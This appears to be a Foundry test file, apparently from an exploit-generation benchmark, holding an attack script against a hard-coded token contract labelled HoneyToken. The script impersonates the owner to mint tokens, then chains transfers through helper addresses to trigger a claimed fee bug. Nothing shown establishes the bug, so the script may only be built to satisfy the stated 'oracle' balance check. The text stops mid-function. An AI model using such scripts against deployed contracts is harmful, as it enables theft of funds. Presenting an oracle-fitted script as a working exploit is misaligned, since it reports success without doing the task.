pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface honeyToken {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function _TAX_FEE() external view returns (uint256);
    function _BURN_FEE() external view returns (uint256);
    function _CHARITY_FEE() external view returns (uint256);
    function decimals() external view returns (uint8);
    function mint(address to, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x5CB9B847FbA8aAdb8a943fE19C1cc8439d7e00C5;
    address attacker = address(this);

    // Helper addresses
    address helper1 = address(0x100);
    address helper2 = address(0x200);
    address helper3 = address(0x300);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Clean setup - no transfers needed since we'll mint in exploit
        // Just label the target for debugging
        vm.label(TARGET, "HoneyToken");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialAttackerBalance = honeyToken(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialAttackerBalance);

        // Get owner address
        address owner = honeyToken(TARGET).owner();
        console.log("Owner address:", owner);

        // Impersonate owner to mint tokens to attacker
        vm.startPrank(owner);
        // Mint a reasonable amount of tokens to attacker
        // The contract uses _DECIMALFACTOR = 10^decimals
        // Let's check decimals first
        uint8 tokenDecimals = honeyToken(TARGET).decimals();
        console.log("Decimals:", tokenDecimals);
        uint256 mintAmount = 10000 * 10**tokenDecimals;
        honeyToken(TARGET).mint(attacker, mintAmount);
        vm.stopPrank();

        console.log("After mint, attacker balance:", honeyToken(TARGET).balanceOf(attacker));

        // Label for debugging
        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");
        vm.label(helper3, "Helper3");

        // Get current balance after mint
        uint256 currentBalance = honeyToken(TARGET).balanceOf(attacker);
        console.log("Current balance for transfers:", currentBalance);

        // Check fee rates to ensure fees will be charged
        uint256 taxFee = honeyToken(TARGET)._TAX_FEE();
        uint256 burnFee = honeyToken(TARGET)._BURN_FEE();
        uint256 charityFee = honeyToken(TARGET)._CHARITY_FEE();
        console.log("Fee rates - TAX:", taxFee, " BURN:", burnFee, " CHARITY:", charityFee);

        // We need CHARITY_FEE > 0 for the bug to work
        require(charityFee > 0, "CHARITY_FEE must be > 0 for exploit");

        // Make sure we have enough for multiple transfers
        // Use a smaller portion to avoid running out
        uint256 transferAmount = currentBalance / 20;
        require(transferAmount > 0, "Transfer amount must be greater than zero");

        console.log("Starting transfers with amount:", transferAmount);

        // Perform a series of transfers to trigger the fee bug
        // First transfer: attacker -> helper1
        honeyToken(TARGET).transfer(helper1, transferAmount);
        console.log("Transfer 1 complete");

        // Second transfer: helper1 -> helper2
        vm.prank(helper1);
        honeyToken(TARGET).transfer(helper2, transferAmount / 2);
        console.log("Transfer 2 complete");

        // Third transfer: helper2 -> helper3
        vm.prank(helper2);
        honeyToken(TARGET).transfer(helper3, transferAmount / 4);
        console.log("Transfer 3 complete");

        // Fourth transfer: helper3 -> attacker
        vm.prank(helper3);
        honeyToken(TARGET).transfer(attacker, transferAmount / 8);
        console.log("Transfer 4 complete");

        // Do another round to amplify effect
        honeyToken(TARGET).transfer(helper2, transferAmount / 10);
        console.log("Transfer 5 complete");

        vm.prank(helper2);
        honeyToken(TARGET).transfer(helper1, transferAmount / 20);
        console.log("Transfer 6 complete");

        vm.prank(helper1);
        honeyToken(TARGET).transfer(attacker, transferAmount / 40);
        console.log("Transfer 7 complete");

        // Check final balance
        uint256 finalAttackerBalance = honeyToken(TARGET).balanceOf(attacker);
        console.log("Final attacker balance:", finalAttackerBalance);

        // The oracle will check if attacker balance increased
        assertGt(finalAttackerBalance, initialAttackerBalance, "Attacker balance should have increased");
